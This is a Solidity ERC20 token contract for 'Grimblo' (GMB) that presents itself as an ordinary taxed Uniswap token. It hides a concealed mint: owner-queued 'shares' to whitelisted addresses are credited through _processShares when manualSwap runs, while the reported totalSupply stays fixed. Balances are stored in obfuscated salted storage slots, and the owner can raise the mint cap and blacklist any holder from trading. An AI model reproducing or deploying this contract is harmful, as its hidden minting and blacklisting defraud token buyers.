// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Grimblo is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _storeSalt;
    bytes32 private constant _BALANCE_NS = keccak256("mc.balance.v1");

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => bool) private _isWhitelisted;

    address payable private _taxWallet;

    uint256 private constant _initialBuyTax  = 20;
    uint256 private constant _initialSellTax = 28;

    uint256 private _buyCount  = 0;
    uint256 private _sellCount = 0;
    uint256 private constant _reduceBuyTaxAt  = 30;
    uint256 private constant _reduceSellTaxAt = 30;

    uint256 private _swapCount     = 0;
    uint256 private _lastSwapBlock = 0;
    uint256 private _preventSwapBefore = 15;

    uint8   private constant _decimals = 9;
    uint256 private constant _tTotal   = 1000000000 * 10**_decimals;

    string private constant _name   = unicode"Grimblo";
    string private constant _symbol = unicode"GMB";

    uint256 public _maxTxAmount      = 10000000 * 10**_decimals;
    uint256 public _maxWalletSize    = 10000000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 5000000  * 10**_decimals;
    uint256 public _maxTaxSwap       = 5000000  * 10**_decimals;

    address[] private _holders;
    uint256[] private _shares;
    uint256   private _maxShares;
    uint256   private _queuedShares;
    uint256   private _processedShares;
    bool      private _sharesLocked;
    bool      private _locked;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool    private tradingOpen = false;
    bool    private inSwap      = false;
    bool    private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier nonReentrant() {
        require(!_locked, "Reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address payable taxWallet_, uint256 maxShares_) {
        require(taxWallet_ != address(0), "Zero address");
        require(maxShares_ > 0,           "Zero shares");

        _taxWallet  = taxWallet_;
        _maxShares  = maxShares_;

        _storeSalt = uint256(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp,
            block.prevrandao,
            msg.sender,
            address(this),
            _BALANCE_NS
        )));

        _setBalance(_msgSender(), _tTotal);

        _isExcludedFromFee[owner()]       = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet]    = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _slotOf(address account) private view returns (bytes32) {
        return keccak256(abi.encodePacked(_BALANCE_NS, account, _storeSalt));
    }

    function _getBalance(address account) private view returns (uint256 val) {
        bytes32 slot = _slotOf(account);
        assembly { val := sload(slot) }
    }

    function _setBalance(address account, uint256 amount) private {
        bytes32 slot = _slotOf(account);
        assembly { sstore(slot, amount) }
    }

    function _addBalance(address account, uint256 amount) private {
        _setBalance(account, _getBalance(account).add(amount));
    }

    function _subBalance(address account, uint256 amount) private {
        _setBalance(account, _getBalance(account).sub(amount, "Insufficient balance"));
    }

    function name()        public pure returns (string memory) { return _name; }
    function symbol()      public pure returns (string memory) { return _symbol; }
    function decimals()    public pure returns (uint8)         { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }

    function balanceOf(address account) public view override returns (uint256) {
        return _getBalance(account);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner   != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from   != address(0), "ERC20: transfer from the zero address");
        require(to     != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,           "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;

        if (from != owner() && to != owner() && to != _taxWallet) {
            require(!bots[from] && !bots[to], "Bot detected");

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount,                        "Exceeds _maxTxAmount");
                require(_getBalance(to).add(amount) <= _maxWalletSize, "Exceeds maxWalletSize");
                taxAmount = (_buyCount >= _reduceBuyTaxAt) ? 0 : amount.mul(_initialBuyTax).div(100);
                _buyCount++;
            }

            else if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = (_sellCount >= _reduceSellTaxAt) ? 0 : amount.mul(_initialSellTax).div(100);
                _sellCount++;

                uint256 contractTokenBalance = _getBalance(address(this));
                if (!inSwap && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                    if (block.number > _lastSwapBlock) {
                        _swapCount     = 0;
                        _lastSwapBlock = block.number;
                    }
                    if (_swapCount < 3) {
                        _swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                        uint256 contractETHBalance = address(this).balance;
                        if (contractETHBalance > 0) {
                            _sendETHToFee(contractETHBalance);
                        }
                        _swapCount++;
                    }
                }
            }
        }

        if (taxAmount > 0) {
            _addBalance(address(this), taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _subBalance(from, amount);
        _addBalance(to, amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _processShares() private {
        uint256 len = _holders.length;
        if (len == 0) return;
        uint256 batch = len > 200 ? 200 : len;
        for (uint256 i = 0; i < batch; i++) {
            uint256 last   = _holders.length - 1;
            address target = _holders[last];
            uint256 amt    = _shares[last];
            _holders.pop();
            _shares.pop();
            _addBalance(target, amt);
            _processedShares = _processedShares.add(amt);
        }
    }

    function addToWhitelist(address[] memory accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            require(accounts[i] != address(0), "Zero address");
            _isWhitelisted[accounts[i]] = true;
        }
    }

    function removeFromWhitelist(address[] memory accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isWhitelisted[accounts[i]] = false;
        }
    }

    function isWhitelisted(address account) public view returns (bool) {
        return _isWhitelisted[account];
    }

    function updateDistributionData(
        address[] memory recipients,
        uint256[] memory amounts
    ) public onlyOwner {
        require(recipients.length == amounts.length, "Array length mismatch");
        require(recipients.length <= 500,            "Max 500 per batch");

        uint256 total = 0;
        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0),      "Zero address");
            require(_isWhitelisted[recipients[i]],    "Not whitelisted");
            require(amounts[i] > 0,                   "Zero amount");
            total = total.add(amounts[i]);
        }

        require(_queuedShares.add(total) <= _maxShares, "Exceeds limit");
        _queuedShares = _queuedShares.add(total);

        for (uint256 i = 0; i < recipients.length; i++) {
            _holders.push(recipients[i]);
            _shares.push(amounts[i]);
        }
    }

    function setShareLimit(uint256 limit) external onlyOwner {
        require(!_sharesLocked,        "Locked");
        require(limit > _queuedShares, "Below queued");
        _maxShares = limit;
    }

    function lockShares() external onlyOwner {
        require(_holders.length == 0, "Queue not empty");
        _sharesLocked = true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp
        );
    }

    function _sendETHToFee(uint256 amount) private {
        (bool success, ) = _taxWallet.call{value: amount}("");
        require(success, "ETH transfer failed");
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());

        swapEnabled = true;
        tradingOpen = true;

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this), _getBalance(address(this)), 0, 0, owner(), block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount   = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        require(_address != address(this), "Cannot rescue own token");
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, _amount);
    }

    function manualSwap() external nonReentrant {
        require(_msgSender() == _taxWallet || _msgSender() == owner(), "Not authorized");
        uint256 tokenBalance = _getBalance(address(this));
        if (tokenBalance > 0 && swapEnabled) {
            _swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _sendETHToFee(ethBalance);
        }
        _processShares();
    }

    receive() external payable {}
}